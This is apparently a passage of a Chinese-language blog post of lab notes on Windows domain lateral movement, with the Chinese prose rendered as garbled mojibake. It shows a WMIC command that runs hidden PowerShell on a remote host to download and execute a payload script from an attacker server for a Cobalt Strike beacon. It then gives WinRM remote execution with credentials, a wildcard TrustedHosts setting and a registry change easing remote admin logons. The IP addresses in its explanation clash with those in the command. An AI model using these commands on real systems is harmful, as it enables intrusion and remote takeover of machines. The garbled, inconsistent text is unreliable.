<p>åœ¨å…ˆå‰å·²ç»å®Œæˆç¥¨æ®å®éªŒçš„å‰æä¸‹</p>
<ol>
<li><p>ç”Ÿæˆpowershellçš„æœ¨é©¬æ‰§è¡Œæ–‡ä»¶<br><img src="https://i.imgur.com/FzPPVJJ.gif"></p>
</li>
<li><p>å‘½ä»¤æ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.255.10 /user:Administrator /password:Win.2024 process call create &quot;powershell.exe -nop -w hidden -c \&quot;IEX((new-object net.webclient).downloadstring(&#x27;http://192.168.255.1:8000/payload.ps1&#x27;))\&quot;&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/9RvGyWF.png" alt="1100"></p>
</li>
</ol>
<ul>
<li>é€šè¿‡WMICå·¥å…·ï¼Œåœ¨è¿œç¨‹è®¡ç®—æœº <code>192.168.197.30</code> ä¸Šä»¥ç®¡ç†å‘˜æƒé™æ‰§è¡Œä¸€æ¡PowerShellå‘½ä»¤ã€‚</li>
<li>PowerShellå‘½ä»¤ä»æœåŠ¡å™¨ <code>http://192.168.31.212</code> ä¸‹è½½å¹¶æ‰§è¡Œåä¸º <code>payload.ps1</code> çš„è„šæœ¬ã€‚</li>
</ul>
<p>æˆåŠŸä¸Šçº¿<br><img src="https://i.imgur.com/lqVR7B4.png"></p>
<h2 id="WinRMï¼ˆCS-ä¸å›æ˜¾ï¼‰"><a href="#WinRMï¼ˆCS-ä¸å›æ˜¾ï¼‰" class="headerlink" title="WinRMï¼ˆCS ä¸å›æ˜¾ï¼‰"></a>WinRMï¼ˆCS ä¸å›æ˜¾ï¼‰</h2><p>WinRMï¼ˆWindows è¿œç¨‹ç®¡ç†ï¼‰æ˜¯ Microsoft å®ç°çš„ WS-Management åè®®ï¼ŒåŸºäºSOAP çš„é˜²ç«å¢™å‹å¥½åè®®ï¼Œç”¨äºç³»ç»Ÿç®¡ç†å’Œä¿¡æ¯äº¤æ¢ã€‚å®ƒå…è®¸ IT ä¸“ä¸šäººå‘˜å’Œå¼€å‘äººå‘˜è¿œç¨‹ç®¡ç† Windows æœåŠ¡å™¨ï¼Œè·å–ç®¡ç†æ•°æ®ï¼Œæ‰§è¡Œè‡ªåŠ¨åŒ–è„šæœ¬ã€‚</p>
<p>WinRM é»˜è®¤ä½¿ç”¨ 5985 ç«¯å£ï¼ˆHTTPï¼‰å’Œ 5986 ç«¯å£ï¼ˆHTTPSï¼‰è¿›è¡Œé€šä¿¡ï¼Œéœ€è¦é…ç½®WinRM ä¾¦å¬å™¨å’Œ TrustedHosts æ‰èƒ½ä»è¿œç¨‹è®¡ç®—æœºè·å–æ•°æ®ã€‚</p>
<p>WinRM æœåŠ¡åœ¨ Windows Server2008 R2 ä¹‹åé»˜è®¤å¼€å¯ï¼Œå®¶åº­ç‰ˆçš„ Windows é»˜è®¤å…³é—­ã€‚</p>
<p>&#x3D;&#x3D;è¯¥æœåŠ¡çš„å¥½å¤„æ˜¯è¿œç¨‹è¿æ¥æ˜¯å®¢æˆ·ç«¯æ— æ„Ÿï¼Œä¸å ç”¨è¿æ¥æ•°ã€‚ä¸€å®šç¨‹åº¦ä¸Šè§„é¿å®‰å…¨è®¾å¤‡ã€‚æ”¯æŒä¸åŒç±»å‹çš„èº«ä»½è®¤è¯ï¼Œå¦‚ NTLM å’Œ Kerberos åè®®ã€‚(é€šè¿‡ PTH PTK PTTè®¤è¯ä¹‹åä¸éœ€è¦å†è¾“å…¥è´¦å·å¯†ç è®¤è¯)&#x3D;&#x3D;powershell ä¸­ä½¿ç”¨ enable-psremoting å‘½ä»¤å¼€å¯æœåŠ¡ï¼Œå¦‚æœæœåŠ¡å·²å¼€å¯ï¼Œä¼šå‡ºç°å¦‚ä¸‹æç¤ºï¼ˆå®é™…ç¯å¢ƒä¸­ä¸€èˆ¬ä¾é ç«¯å£ 5985 å’Œ 5986 æ¥åˆ¤æ–­æœåŠ¡æ˜¯å¦å¼€å¯ã€‚ï¼‰:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enable-PSRemoting</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/1XiNNAP.png"></p>
<p>åŸºæœ¬ä½¿ç”¨:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:http://192.168.255.10:5985 -u:administrator -p:Win.2024 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>[!NOTE]<br>å¦‚æœå‡ºç° WinRM å®¢æˆ·ç«¯æ— æ³•å¤„ç†è¯¥è¯·æ±‚ï¼Œä½¿ç”¨ administrator ç”¨æˆ·æ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">winrm quickconfig -q</span><br><span class="line"></span><br><span class="line">winrm set winrm/config/Client @&#123;TrustedHosts=&quot;*&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…ä¿®æ”¹æ³¨å†Œè¡¨:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2024/12/22/%E4%B8%AD%E9%97%B4%E4%BB%B6/" rel="prev" title="ä¸­é—´ä»¶">
      <i class="fa fa-chevron-left"></i> ä¸­é—´ä»¶
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%8F%8A%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C"><span class="nav-number">1.</span> <span class="nav-text">æœ¬åœ°ä¿¡æ¯æ”¶é›†åŠåŸºç¡€æ“ä½œ</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">åŸŸå†…ä¿¡æ¯æ”¶é›†</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="nav-number">2.1.</span> <span class="nav-text">åŸºæœ¬ä¿¡æ¯</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96"><span class="nav-number">3.</span> <span class="nav-text">å¯†ç è·å–</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%BB%E5%8F%96-lsass-%E8%BF%9B%E7%A8%8B%E5%86%85%E5%AD%98%E5%AF%86%E7%A0%81"><span class="nav-number">3.1.</span> <span class="nav-text">è¯»å– lsass è¿›ç¨‹å†…å­˜å¯†ç </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BD%AC%E5%82%A8"><span class="nav-number">3.2.</span> <span class="nav-text">è½¬å‚¨</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%AB%98%E7%89%88%E6%9C%AC%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96"><span class="nav-number">3.3.</span> <span class="nav-text">é«˜ç‰ˆæœ¬å¯†ç æŠ“å–</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9-Wdigest-%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="nav-number">3.4.</span> <span class="nav-text">ä¿®æ”¹ Wdigest æ³¨å†Œè¡¨</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E6%B3%A8%E5%85%A5-SSP"><span class="nav-number">3.5.</span> <span class="nav-text">å†…å­˜æ³¨å…¥ SSP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%B7%BB%E5%8A%A0-SSP"><span class="nav-number">3.6.</span> <span class="nav-text">æ³¨å†Œè¡¨æ·»åŠ  SSP</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%9F%E6%8E%A7%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96"><span class="nav-number"></span> <span class="nav-text">åŸŸæ§å¯†ç æŠ“å–</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#NTDS-%E6%96%87%E4%BB%B6%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">NTDS æ–‡ä»¶ä»‹ç»</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%B7%E5%BD%B1%E6%8B%B7%E8%B4%9D%E6%8F%90%E5%8F%96%E5%9F%9F%E6%8E%A7-NTDS"><span class="nav-number">1.1.</span> <span class="nav-text">å·å½±æ‹·è´æå–åŸŸæ§ NTDS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A6%BB%E7%BA%BF%E8%AF%BB%E5%8F%96-NTDS"><span class="nav-number">1.2.</span> <span class="nav-text">ç¦»çº¿è¯»å– NTDS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8%E7%BA%BF%E8%AF%BB%E5%8F%96-NTDS"><span class="nav-number">1.3.</span> <span class="nav-text">åœ¨çº¿è¯»å– NTDS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dcsync-%E5%8E%9F%E7%90%86%E5%8F%8A%E6%94%BB%E5%87%BB"><span class="nav-number">2.</span> <span class="nav-text">Dcsync åŸç†åŠæ”»å‡»</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#dcsync-%E8%BF%9C%E7%A8%8B%E8%AF%BB%E5%8F%96%E5%9F%9F%E6%8E%A7-hash"><span class="nav-number">2.1.</span> <span class="nav-text">dcsync è¿œç¨‹è¯»å–åŸŸæ§ hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dcsync-%E8%BF%9C%E7%A8%8B%E8%AF%BB%E5%8F%96%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81"><span class="nav-number">2.2.</span> <span class="nav-text">dcsync è¿œç¨‹è¯»å–æ˜æ–‡å¯†ç </span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RDP-%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96"><span class="nav-number">3.</span> <span class="nav-text">RDP å¯†ç æŠ“å–</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%94%E7%94%A8%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96"><span class="nav-number">4.</span> <span class="nav-text">åº”ç”¨è½¯ä»¶å¯†ç æŠ“å–</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96"><span class="nav-number">4.1.</span> <span class="nav-text">æµè§ˆå™¨å¯†ç æŠ“å–</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="nav-number">5.</span> <span class="nav-text">å†…ç½‘æ¨ªå‘ç§»åŠ¨</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9C%E6%8E%A7%E8%BD%AF%E4%BB%B6"><span class="nav-number">5.1.</span> <span class="nav-text">è¿œæ§è½¯ä»¶</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#RDP"><span class="nav-number">5.1.1.</span> <span class="nav-text">RDP</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IPC-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="nav-number">6.</span> <span class="nav-text">IPC$æ¨ªå‘ç§»åŠ¨</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0%E5%92%8C%E8%BF%9E%E6%8E%A5%E6%96%B9%E5%BC%8F"><span class="nav-number">6.1.</span> <span class="nav-text">æ¦‚è¿°å’Œè¿æ¥æ–¹å¼</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ipc-%E9%85%8D%E5%90%88%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="nav-number">6.2.</span> <span class="nav-text">ipc$é…åˆè®¡åˆ’ä»»åŠ¡</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ipc-%E9%85%8D%E5%90%88%E6%9C%8D%E5%8A%A1"><span class="nav-number">6.3.</span> <span class="nav-text">ipc$é…åˆæœåŠ¡</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PTH"><span class="nav-number">7.</span> <span class="nav-text">PTH</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8D%E5%90%8C%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E5%8C%BA%E5%88%AB"><span class="nav-number">7.1.</span> <span class="nav-text">ä¸åŒç”¨æˆ·æƒé™åŒºåˆ«</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Hash-%E7%A2%B0%E6%92%9E%E6%9F%A5%E8%AF%A2%E5%8F%AF%E7%94%A8-PTH"><span class="nav-number">7.2.</span> <span class="nav-text">Hash ç¢°æ’æŸ¥è¯¢å¯ç”¨ PTH</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Mimikatz"><span class="nav-number">7.2.1.</span> <span class="nav-text">Mimikatz</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CS-PTH-%E4%B8%8A%E7%BA%BF"><span class="nav-number">7.2.2.</span> <span class="nav-text">CS PTH ä¸Šçº¿</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CractMapExec%E6%89%B9%E9%87%8F-pth"><span class="nav-number">7.2.3.</span> <span class="nav-text">CractMapExecæ‰¹é‡ pth</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PTK"><span class="nav-number">7.3.</span> <span class="nav-text">PTK</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#PTK-%E4%B8%8A%E7%BA%BF-CS"><span class="nav-number">7.3.1.</span> <span class="nav-text">PTK ä¸Šçº¿ CS</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PTT-PTC"><span class="nav-number">7.4.</span> <span class="nav-text">PTT&amp;PTC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="nav-number">7.5.</span> <span class="nav-text">é»„é‡‘ç¥¨æ®</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="nav-number">7.6.</span> <span class="nav-text">ç™½é“¶ç¥¨æ®</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C-%E4%BD%BF%E7%94%A8-mimikatz-%E5%88%B6%E4%BD%9C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%EF%BC%9A"><span class="nav-number">7.6.1.</span> <span class="nav-text">å®éªŒ-ä½¿ç”¨ mimikatz åˆ¶ä½œç™½é“¶ç¥¨æ®ï¼š</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C-%E4%BC%AA%E9%80%A0-ldap-%E6%9C%8D%E5%8A%A1%E4%B8%8A%E7%BA%BF-dc%EF%BC%9A"><span class="nav-number">7.6.2.</span> <span class="nav-text">å®éªŒ-ä¼ªé€  ldap æœåŠ¡ä¸Šçº¿ dcï¼š</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WinRM%EF%BC%88CS-%E4%B8%8D%E5%9B%9E%E6%98%BE%EF%BC%89"><span class="nav-number">8.</span> <span class="nav-text">WinRMï¼ˆCS ä¸å›æ˜¾ï¼‰</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="kecçš„åšå®¢"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">kecçš„åšå®¢</p>
  <div class="site-description" itemprop="description">ä¸€å¥è¯çš„é•¿åº¦</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">22</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">åˆ†ç±»</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">17</span>
        <span class="site-state-item-name">æ ‡ç­¾</span></a>
      </div>
  </nav>
</div>


  <div class="links-of-blogroll motion-element">
    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://1234567fang.github.io/" title="https:&#x2F;&#x2F;1234567fang.github.io&#x2F;" rel="noopener" target="_blank">å‹é“¾</a>
        </li>
    </ul>
  </div>

      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">kecçš„åšå®¢</span>
</div>
  <div class="powered-by">ç”± <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> å¼ºåŠ›é©±åŠ¨
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
